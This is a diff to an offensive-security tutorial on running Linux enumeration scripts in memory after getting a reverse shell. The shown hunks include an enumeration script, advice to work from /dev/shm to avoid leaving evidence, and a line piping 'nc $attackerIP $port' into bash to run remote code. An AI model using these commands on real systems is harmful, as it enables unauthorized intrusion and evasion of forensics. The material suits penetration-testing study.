@@ -17,6 +17,9 @@ Scenario: You have just gotten a shiny new reverse shell on a Unix-based machine
 
 ```bash
 #!/bin/sh
+# simple-enum.sh
+#For conducting simple enumeration of linux machines
+
 echo [+] Distribution and kernel version
 cat /etc/issue
 uname -a
@@ -68,11 +71,11 @@ echo [+] Writable files outside HOME
 mount -l find / -path “$HOME” -prune -o -path “/proc” -prune -o \( ! -type l \) \( -user `id -u` -perm -u=w  -o -group `id -g` -perm -g=w  -o -perm -o=w \) -ls 2>/dev/null
 ```
 
-Say you have written the simple enumeration script above that you have saved to your machine, but you want to execute it on the victim's machine. Or, you have downloaded one of the more popular enumeration scripts such as [LinEnum.sh](https://github.com/rebootuser/LinEnum) or [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS.)
+Say you have written the simple enumeration script above that you have saved to your machine, but you want to execute it on the victim's machine. Or, you have downloaded one of the more popular enumeration scripts such as [LinEnum.sh](https://github.com/rebootuser/LinEnum) or [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).  How do you do this without leaving behind obvious evidence that you were there?
 
 ## /dev/shm
 
-It is recommended to use the directory `/dev/shm` to work out of to avoid writing files to the disk.  This is a virtual directory that only exists in memory.  Any files left behind here will be wiped when the system shuts down or restarts.
+First of all, I recommend to use the directory `/dev/shm` to work out of to avoid writing files to the disk.  This is a virtual directory that only exists in memory.  Any files left behind here will be wiped when the system shuts down or restarts.
 
 ```bash
 cd /dev/shm
@@ -125,7 +128,7 @@ nc $attackerIP $port | bash
 
 ## Other Examples
 
-If you have any other examples of methods of executing remote scripts directly in memory, or have any other fun or useful tips or tricks, feel free to contact me on Github at https://github.com/zweilosec or on social media!
+If you have any other examples of methods of executing remote scripts directly in memory, or have any other fun or useful tips or tricks, feel free to contact me on Github at [https://github.com/zweilosec](https://github.com/zweilosec) or on social media!
 
 If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=zweilosec&button_colour=FFDD00&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=ffffff"></a>
 
